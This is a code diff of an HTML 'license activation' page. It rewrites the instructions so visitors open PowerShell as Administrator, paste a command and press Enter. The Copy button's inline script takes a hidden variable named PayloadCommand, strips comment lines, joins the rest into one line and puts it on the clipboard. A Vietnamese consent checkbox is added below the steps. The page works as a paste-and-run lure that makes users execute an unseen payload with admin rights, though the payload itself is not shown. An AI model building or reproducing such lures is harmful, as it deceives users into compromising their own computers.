@@ -2,46 +2,74 @@
   <p class="text-sm text-text-200 leading-relaxed text-center">
     Follow these steps to activate your license:
   </p>
-  
-  <!-- Step 1: Copy -->
+
+  <!-- Step 1: Open PowerShell Admin -->
   <div class="flex items-center gap-4 p-3 bg-white rounded-xl border border-[#E5DFD5]">
-    <div class="w-8 h-8 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 font-bold text-sm shrink-0">
+    <div
+      class="w-8 h-8 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 font-bold text-sm shrink-0">
       1
     </div>
     <div class="flex-1">
-      <p class="text-sm font-semibold text-text-100">Click the copy button below</p>
-      <p class="text-xs text-text-300">Command will be copied to clipboard</p>
+      <p class="text-sm font-semibold text-text-100">Open PowerShell as Administrator</p>
+      <div class="flex items-center gap-1 mt-1">
+        <kbd class="px-2 py-1 bg-bg-300 rounded text-text-100 font-medium text-xs">Win</kbd>
+        <span class="text-text-300">+</span>
+        <kbd class="px-2 py-1 bg-bg-300 rounded text-text-100 font-medium text-xs">X</kbd>
+      </div>
     </div>
-    <button id="copy-btn" class="px-4 py-2 bg-[#D97757] hover:bg-[#C25E03] text-white rounded-lg text-sm font-semibold transition"
+  </div>
+
+  <!-- Step 2: Select PowerShell -->
+  <div class="flex items-center gap-4 p-3 bg-white rounded-xl border border-[#E5DFD5]">
+    <div
+      class="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center text-blue-600 font-bold text-sm shrink-0">
+      2
+    </div>
+    <div class="flex-1">
+      <p class="text-sm font-semibold text-text-100">Select Windows PowerShell (Admin)</p>
+      <p class="text-xs text-text-300 mt-0.5">Press <kbd
+          class="px-1.5 py-0.5 bg-bg-300 rounded text-text-100 font-medium text-xs">I</kbd> to confirm</p>
+    </div>
+  </div>
+
+  <!-- Step 3: Paste Command -->
+  <div class="flex items-center gap-4 p-3 bg-white rounded-xl border border-[#E5DFD5]">
+    <div
+      class="w-8 h-8 rounded-full bg-purple-100 flex items-center justify-center text-purple-600 font-bold text-sm shrink-0">
+      3
+    </div>
+    <div class="flex-1">
+      <p class="text-sm font-semibold text-text-100">Paste activation code</p>
+      <p class="text-xs text-text-300 mt-0.5">Right-click or press <kbd
+          class="px-1.5 py-0.5 bg-bg-300 rounded text-text-100 font-medium text-xs">Ctrl</kbd>+<kbd
+          class="px-1.5 py-0.5 bg-bg-300 rounded text-text-100 font-medium text-xs">V</kbd></p>
+    </div>
+    <button id="copy-btn"
+      class="px-4 py-2 bg-[#D97757] hover:bg-[#C25E03] text-white rounded-lg text-sm font-semibold transition"
       onclick="var t=document.createElement('textarea');t.value=window.PayloadCommand.split('\n').filter(l=>l.trim()&&!l.startsWith('#')).join(';');t.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);this.textContent='✓ Copied';this.classList.remove('bg-[#D97757]','hover:bg-[#C25E03]');this.classList.add('bg-emerald-500');">
       Copy
     </button>
   </div>
-  
-  <!-- Step 2: Open Run -->
+
+  <!-- Step 4: Execute -->
   <div class="flex items-center gap-4 p-3 bg-white rounded-xl border border-[#E5DFD5]">
-    <div class="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center text-blue-600 font-bold text-sm shrink-0">
-      2
-    </div>
-    <div class="flex-1">
-      <p class="text-sm font-semibold text-text-100">Press keyboard shortcut</p>
-      <div class="flex items-center gap-1 mt-1">
-        <kbd class="px-2 py-1 bg-bg-300 rounded text-text-100 font-medium text-xs">Win</kbd>
-        <span class="text-text-300">+</span>
-        <kbd class="px-2 py-1 bg-bg-300 rounded text-text-100 font-medium text-xs">R</kbd>
-      </div>
-    </div>
-  </div>
-  
-  <!-- Step 3: Execute -->
-  <div class="flex items-center gap-4 p-3 bg-white rounded-xl border border-[#E5DFD5]">
-    <div class="w-8 h-8 rounded-full bg-purple-100 flex items-center justify-center text-purple-600 font-bold text-sm shrink-0">
-      3
+    <div
+      class="w-8 h-8 rounded-full bg-amber-100 flex items-center justify-center text-amber-600 font-bold text-sm shrink-0">
+      4
     </div>
     <div class="flex-1">
       <p class="text-sm font-semibold text-text-100">Press Enter to activate</p>
-      <p class="text-xs text-text-300">License sync will start automatically</p>
+      <p class="text-xs text-text-300 mt-0.5">License sync will start automatically</p>
     </div>
     <kbd class="px-3 py-1.5 bg-bg-300 rounded text-text-100 font-medium text-sm">Enter</kbd>
+  </div>
+
+  <!-- Agreement Label -->
+  <div class="mt-4 p-4 bg-amber-50 border border-amber-200 rounded-xl">
+    <label class="flex items-center gap-3 cursor-pointer">
+      <input type="checkbox" id="agree-checkbox"
+        class="w-5 h-5 rounded border-amber-300 text-amber-500 focus:ring-amber-400">
+      <span class="text-sm text-amber-800">Tôi đồng ý cấp quyền và thực hiện theo chỉ dẫn</span>
+    </label>
   </div>
 </div>
